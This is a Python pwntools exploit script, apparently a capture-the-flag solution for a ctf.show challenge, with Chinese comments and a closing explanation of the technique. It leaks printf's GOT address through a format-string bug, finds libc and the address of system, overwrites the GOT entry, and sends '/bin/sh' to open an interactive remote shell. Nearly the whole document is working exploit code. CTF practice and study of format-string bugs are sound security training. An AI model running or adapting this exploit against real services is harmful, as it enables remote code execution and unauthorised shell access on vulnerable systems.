from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28138)
elf = ELF("./pwn")

# 等待提示信息
io.recvuntil(" * ********************************** ")

# test = b'aaaa' + b'%p--' * 10：用于测试格式化字符串的偏移量
test = b'aaaa' + b'%p--' * 10

# offset = 6：格式化字符串的偏移量
offset = 6

# printf_got = elf.got['printf']：printf函数的GOT表地址
printf_got = elf.got['printf']

# payload1 = p32(printf_got) + b'%6$s'：构造格式化字符串payload，用于泄露printf函数的地址
# p32(printf_got)：将printf的GOT表地址作为参数
# %6$s：读取第6个参数指向的字符串（即printf的GOT表内容）
payload1 = p32(printf_got) + b'%6$s'

io.send(payload1)

# printf_addr = u32(io.recvuntil('\xf7')[-4:])：接收并解析泄露的printf函数地址
# u32()：将4字节数据转换为32位无符号整数
# recvuntil('\xf7')：接收直到遇到0xf7（libc地址的特征）
# [-4:]：取最后4字节作为printf的地址
printf_addr = u32(io.recvuntil('\xf7')[-4:])

# libc = LibcSearcher('printf', printf_addr)：使用LibcSearcher根据printf地址查找libc版本
libc = LibcSearcher('printf', printf_addr)

# libc_base = printf_addr - libc.dump('printf')：计算libc基址
libc_base = printf_addr - libc.dump('printf')

# system_addr = libc_base + libc.dump('system')：计算system函数的实际地址
system_addr = libc_base + libc.dump('system')

# payload = fmtstr_payload(offset, {printf_got:system_addr})：构造格式化字符串payload
# 将printf的GOT表地址覆盖为system函数的实际地址
payload = fmtstr_payload(offset, {printf_got:system_addr})

io.send(payload)
io.send(payload)  # 发送两次payload确保覆盖成功

# 发送/bin/sh字符串，当程序调用printf时会执行system("/bin/sh")
io.send('/bin/sh')
io.recv()

io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞 + 信息泄露 + GOT表劫持
2. 核心原理：
   - 首先利用格式化字符串漏洞泄露printf函数的地址
   - 根据泄露的地址计算libc基址和system函数地址
   - 再次利用格式化字符串漏洞将printf的GOT表项修改为system函数地址
   - 发送/bin/sh字符串，当程序调用printf时执行system("/bin/sh")
3. 关键步骤：
   - 泄露printf地址：payload1 = p32(printf_got) + b'%6$s'
   - 计算libc基址：libc_base = printf_addr - libc.dump('printf')
   - 覆盖GOT表：fmtstr_payload(offset, {printf_got:system_addr})
4. 执行流程：
   - 泄露printf地址 -> 计算system地址 -> 覆盖GOT表 -> 触发system("/bin/sh")
5. 技术要点：
   - 格式化字符串的偏移量确定
   - GOT表地址的获取
   - LibcSearcher的使用
   - 地址泄露和计算
"""
